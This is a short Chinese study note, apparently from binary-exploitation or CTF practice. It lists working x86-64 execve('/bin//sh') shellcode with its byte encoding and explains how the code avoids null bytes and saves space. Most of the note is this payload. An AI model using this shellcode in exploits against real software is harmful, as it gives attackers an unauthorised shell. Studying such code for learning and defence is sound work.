# 知识点
```
xor    rsi, rsi                 # 48 31 f6
push   rsi                      # 56
movabs rdi, 0x68732f2f6e69622f  # 48 bf 2f 62 69 6e 2f 2f 73 68
push   rdi                      # 57
push   rsp                      # 54
pop    rdi                      # 5f   
push   0x3b                     # 6a 3b
pop    rax                      # 58
cdq                             # 99
syscall                         # 0f 05
```

-关键优化点
- 指令选择
使用push/pop代替mov减少字节（如设置rdi和rax）。
cltd替代xor edx, edx节省1字节。

- 字符串构造s
8字节对齐的/bin//sh避免空字符。
通过栈操作隐式生成字符串，避免显式存储。

- 零字节规避
所有指令机器码均无\x00，防止截断。


# getshell
![](https://r2.20161023.xyz/pic/20250513120026815.png)